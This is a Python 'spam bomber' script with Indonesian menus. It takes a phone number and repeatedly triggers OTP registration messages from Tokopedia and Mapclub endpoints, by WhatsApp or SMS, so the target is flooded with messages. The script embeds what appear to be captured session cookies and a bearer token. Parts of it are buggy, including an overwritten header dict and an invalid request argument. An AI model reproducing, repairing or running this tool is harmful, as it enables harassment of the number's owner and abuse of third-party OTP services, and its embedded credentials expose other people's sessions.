import requests
import json
import time
import colorama
from bs4 import BeautifulSoup
from random import choice, randint, shuffle

class Color:
        PURPLE = '\033[95m'
        CYAN = '\033[96m'
        DARKCYAN = '\033[36m'
        BLUE = '\033[94m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'
        BOLD = '\033[1m'
        UNDERLINE = '\033[4m'
        END = '\033[0m'

def status():
    while True:
        print(Color.GREEN +"""
======================================================================================
░██████╗██████╗░███╗░░░███╗  ██████╗░░█████╗░░█████╗░████████╗░██████╗███████╗░█████╗░
██╔════╝██╔══██╗████╗░████║  ██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██╔════╝██╔══██╗
╚█████╗░██████╔╝██╔████╔██║  ██████╔╝██║░░██║██║░░██║░░░██║░░░╚█████╗░█████╗░░██║░░╚═╝
░╚═══██╗██╔═══╝░██║╚██╔╝██║  ██╔══██╗██║░░██║██║░░██║░░░██║░░░░╚═══██╗██╔══╝░░██║░░██╗
██████╔╝██║░░░░░██║░╚═╝░██║  ██║░░██║╚█████╔╝╚█████╔╝░░░██║░░░██████╔╝███████╗╚█████╔╝
╚═════╝░╚═╝░░░░░╚═╝░░░░░╚═╝  ╚═╝░░╚═╝░╚════╝░░╚════╝░░░░╚═╝░░░╚═════╝░╚══════╝░╚════╝░
                          ☠Developer BY ROotSecurityGrub☠
======================================================================================
""" + Color.END)
        print(Color.CYAN + "[1] 🚀SPAM WHATSAPP🚀" + Color.END)
        print(Color.CYAN + "[2] 🚀SPAM SMS🚀" + Color.END)
        print(Color.RED + "[0] Keluar" + Color.END)
        pilih = input(Color.YELLOW + "Pilih > " + Color.END)

        if pilih == "1" or pilih == "01":
            number = input(Color.YELLOW + "🤖Masukan Nomor > " + Color.END)
            headers = {
                    "Origin": "https://www.mapclub.com",
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Language": "in-ID",
                    "Authorization": "BearereyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiI1NjEzOWIxZi02OThlLTRkMjYtOTZhNC1lYjU5YWViN2U2YjciLCJleHBpcmVkIjoxNzE0OTE1OTkzMDAyLCJleHBpcmUiOjM2MDAsImV4cCI6MTcxNDkxNTk5MywiaWF0IjoxNzE0OTEyMzkzLCJwbGF0Zm9ybSI6IldFQiJ9.ir-MSWlnfbc_u-rSOSb2j9Y7hmcPaVcNRPFce5ZcE_OwHxnqPnXmk_WVzZggmTIUwwxvsBAt3v8sW-74M7anyg",
                    "Client-Platform": "WEB",
                    "Client-Timestamp": "1714911841066",
                    "Connection": "keep-alive",
                    "Content-Length": "25",
                    "Content-Type": "application/json",
                    # "Host": "beryllium.mapclub.com",
                    "Referer": "https://www.mapclub.com/",
                    "Sec-Ch-Ua-Mobile": "?0",
                    "Sec-Ch-Ua-Platform": "\"Windows\"",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-site",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                    "Accept-Encoding": "gzip, deflate, br, zstd"
                }
            headers = {
                    "Origin": "https://www.tokopedia.com",
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8,id;q=0.7",
                    "Content-Length": "800",
                    "Content-Type": "application/json",
                    "Cookie": "DID=e0fd3c228720a7b9d9d6af4827c23a1fb6e804dbbcda4236a25f1ecd958805fe72109d40adc8e9e32f2e61ddd5f6c5dd; _gcl_au=1.1.696070523.1709398641; S_L_8e3fb6ead43b859c726d3e836a126f0a=420913733edb131b7ef824ca222a4b72~20240601000417; l=1; aus=1; FPF=1; lasty=6; DID_JS=JANXkPZCbmf0UggjYxWLnROj0R2bNx25C1q7XZ34eT0=; _UUID_NONLOGIN_=2acb27ac09bface188f51a9dd07c4202; _UUID_NONLOGIN_.sig=ivl_PYK1va7G1g1alDF19t_Ctcw; bm_mi=198C2E06055461654BE167B99079C00A~YAAQNGJ6cp+T1k+PAQAAMSu6URdawi4PxE1+giRJlTEKfdSqH5vSHyUhGvn9Cjm2xKsNdplCnf3c2g7tr2gheLhELjbUfYdJ8ltzeAgbxPDu99Amk4qgIf5FxHFhKjWluJz5ivm2c0nSSBNBuy3mvQwcZbedueKjGoELj9+UIbSrLVn6fvrk1mGYYAlY4QMGgMXzSDYkOgjC9MyNbMvt8b7DA+r3vfzBG9SeBU9Fdul9Uwa428p/k9/OWNxHvOrryZ9Vzsh6VyhBp+mf2+Nm9aeJFj/BR2RrulyoJwaev1Zd0vDUIOyX1GJk0jPXINjLFL8epk2a/y9TO+3O9eA0pECnsNwQT1I=~1; _SID_Tokopedia_=MYZo09adWsQ2uWZbmdM3sntybGlGo5NALoFkCDc78oEeWD96vEuQjRRyGRsoTGrloST7H-QBqQ5gPAHkdWJBIBM_9w-WSbzvWgI-EOeGOrB_4v1QzRf6ropzwJ9Kf_NV; ak_bmsc=A3C6F3AC7DD5CBAC6D4F5216AB7194CC~000000000000000000000000000000~YAAQNGJ6ctCT1k+PAQAAIzK6URdgBsHsfceDUptw7pIBbH3AIqUI113ONKKsB6SaCxlD5pae0V+GzzqhVpfrtwCAX7XQNi+AtszD6p3MBMtGvDaEHLDjaCkYkNMjGkadBoXXUTP1DNjgADlp2w9arYeYDpUrNSFY3JLHvok47oDOD/U4wiwVCnhPm4wJlos9fJlxHctb5uS2/3EkQcuJzfdGpTMOhYf1TkPT1j8fL6Hqp1Bvd0zvETxoeqVwLuRvlxIb6A1v3/YKgf8D3JEqcWHQkYZ2m3eRvK0lBjUNAbwnQDN0779zPJygm4lYYbqNemPGEnoMJuQticzJSfLFr+2SkKalI1aBKGNkeKlX2lW9PsPmYR2uLv21ZK7YUfy0pYnZr9UHBn6VY1qV6UY2z40rla2Ne/Lf4ww22PnQFtzC9pqhxpRivmazzzFSjnfdH6pn52DeF+cFU2B+rOQ+OdHC3FSDbSssuaQ2l+5z9iK9X1S2msFN4xqLXxYzZDpGaLaJLzgRzJgsgyniqFG/JfoVospduKbgNXRrTSh6/MSKx8ZPtoJ1ZnLAs7eWrFytnJoNiWoAqILWHTCv2liIAhAlEPAeeOqe16waCyKFIW163/A=; _gid=GA1.2.1123379740.1715062475; _UUID_CAS_=398a037d-d9cd-4ec3-81fb-bdd1e154d2e8; _CASE_=237a3c113c7a626a6a6f6c747a39113c7a6268747a343a347a627a123933392a2c3978082d2b392c7a747a3b113c7a62696f6e747a3437363f7a627a7a747a34392c7a627a7a747a281b377a627a7a747a2f113c7a62696a6a69686b6f6d747a2b113c7a6269696d6b686d6f6b747a2b0c21283d7a627a6a307a747a2f302b7a627a0323047a2f392a3d30372d2b3d07313c047a62696a6a69686b6f6d74047a2b3d2a2e313b3d072c21283d047a62047a6a30047a74047a07072c21283d3639353d047a62047a0f392a3d30372d2b3d2b047a25057a747a340d283c7a627a6a686a6c75686d75686f0c696b626a6d62686173686f6268687a25; AMP_TOKEN=%24NOT_FOUND; _dc_gtm_UA-126956641-6=1; _dc_gtm_UA-9801603-1=1; _gat_UA-9801603-1=1; ISID=%7B%22developer.tokopedia.com%22%3A%22ZGV2ZWxvcGVyLnRva29wZWRpYS5jb20%3D.845d6bb08b2a04ca69c05a8884269b10.1709398639137.1709398639137.1709398705476.6%22%2C%22accounts.tokopedia.com%22%3A%22YWNjb3VudHMudG9rb3BlZGlhLmNvbQ%3D%3D.8b25487db2747458b9f8dddb7988d077.1709398642012.1709398642012.1709398654206.1%22%2C%22www.tokopedia.com%22%3A%22d3d3LnRva29wZWRpYS5jb20%3D.84658221bf7794f14b396a2f61167256.1715062475420.1715062475420.1715062478291.2%22%7D; _ga=GA1.2.10287001.1709398684; _abck=B63D6FDFCB1EB75418F69477D2CE17D1~0~YAAQXunOF2AYbkGPAQAAFaC6UQtsuiPqgvaXtMBMMfZHLKcikpnNh6DRtgmxmM/CagSzzKUC05/wPOtwzMryyl9FPi55lD4L5k8/1jsON0K4Azcfg5RG5GqO03DoDcGC/tlvTZVLq/R5o+mkvjJbk/OhQIg5QYA3fzc2bqhqf5bX1OZ2TC6p11onTZgxG/SpbP4QfM4McpqxgtveJMzQo+I6JY89tb1lNJdvxcAfvHQSb6bLf6bDi0HdIeVJjvDuXKdVu2U3zgwFShFJcNhV0u3wMmJE6ZPE09V/40+jy/2w9OMWwzKUpTodxkzWWFv3TxUi38pr+UaxZx99fmYJ2nHejHqcmK+BPrYoOzY1GPXMXQ0uKB/MEfKTGoGfEGrU/QNElnazqU2mghPUyHGn/GHEcrA5R6n+MQAs~-1~-1~-1; bm_sz=F661FCD6F40CC0886D1E79719CD9F208~YAAQXunOF2EYbkGPAQAAFaC6URfsgbZ5NE/KDFtKmdWbzDzVpKuw7TWjqSbg7MOCV6t4XCFxfyfFs4HLucUyB7NLkN6w/LUe9Z9/COXjtJrrU7H5Q1YOynS100ZOdni2YrjiAbXuxyhwDJdsnYk65kYmzwlTDR7rS2Ci97SFffoPSHKB/Rcevpk8sa7cOpM2RvUiI9BJUDvPJdGpka+2KcbdRepJ7/oZX37uxIHMMUChHG53CuHTiIFNlVQRHj5U2bzx8XMle7XAFSSKhTfXsOUGExA5G3FQFcVHUt3y27jEBBPkAdGRpPmumvgubPdqvwYSPSjj0/UnHyxyTcKLp3cInVUjj08QHY12572MSoxr5rN+QGBnJsG6lV9X6En8FCmdfmyktF3do+bWpk2HXkrKodBQkQ==~4342834~3617093; _ga_70947XW48P=GS1.1.1715062475.2.1.1715062508.27.0.0",
                    "Priority": "u=1, i",
                    "Referer": "https://www.tokopedia.com/register",
                    "Sec-Ch-Ua-Mobile": "?0",
                    "Sec-Ch-Ua-Platform": "\"Windows\"",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-site",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                    "X-Device": "tokopedia-lite",
                    "X-Source": "tokopedia-lite",
                    "X-Tkpd-Akamai": "otp",
                    "X-Tkpd-Lite-Service": "zeus",
                    "X-Version": "ea3e096"
            }

            
            data = json.dumps({"account": number})
            dataku = json.dumps({"msisdn": number, "otpType": "116", "mode": "whatsapp", "otpDigit": 6})

            for i in range(50):
                post = requests.post("https://gql.tokopedia.com/graphql/OTPRequest", headers=headers, dataku=dataku)
                post = requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp?channel=WHATSAPP", headers=headers, data=data)
                print(Color.YELLOW + "🚀membuat spam 50 Timer 60 detik...🚀"+ Color.END)
                time.sleep(60)
                print(Color.GREEN + f"🚀SMS Terkirim method POST {post}🚀" + Color.END)

        elif pilih == "2" or pilih == "02":
            number = input(Color.YELLOW + "🤖Masukan Nomor > " + Color.END)
            headers = {
                "Origin": "https://www.mapclub.com",
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "in-ID",
                "Authorization": "BearereyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiI1NjEzOWIxZi02OThlLTRkMjYtOTZhNC1lYjU5YWViN2U2YjciLCJleHBpcmVkIjoxNzE0OTE1OTkzMDAyLCJleHBpcmUiOjM2MDAsImV4cCI6MTcxNDkxNTk5MywiaWF0IjoxNzE0OTEyMzkzLCJwbGF0Zm9ybSI6IldFQiJ9.ir-MSWlnfbc_u-rSOSb2j9Y7hmcPaVcNRPFce5ZcE_OwHxnqPnXmk_WVzZggmTIUwwxvsBAt3v8sW-74M7anyg",
                "Client-Platform": "WEB",
                "Client-Timestamp": "1714911841066",
                "Connection": "keep-alive",
                "Content-Length": "25",
                "Content-Type": "application/json",
                "Referer": "https://www.mapclub.com/",
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": "\"Windows\"",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/124.0.0.0 Safari/537.36",
                "Accept-Encoding": "gzip, deflate, br, zstd"
            }
            
            data = json.dumps({"account": number})

            for i in range(50):
                post = requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp?channel=SMS", headers=headers, data=data)
                print(Color.YELLOW + "🚀membuat spam 50 Timer 60 detik...🚀"+ Color.END)
                time.sleep(50)
                print(Color.GREEN + f"🚀SMS Terkirim method GET {post}🚀" + Color.END)
        elif pilih == "0":
            break
        else:
            print(Color.RED + "😈Pilihan tidak valid. Silakan pilih 0, 1, atau 2.😈" + Color.END)

status()
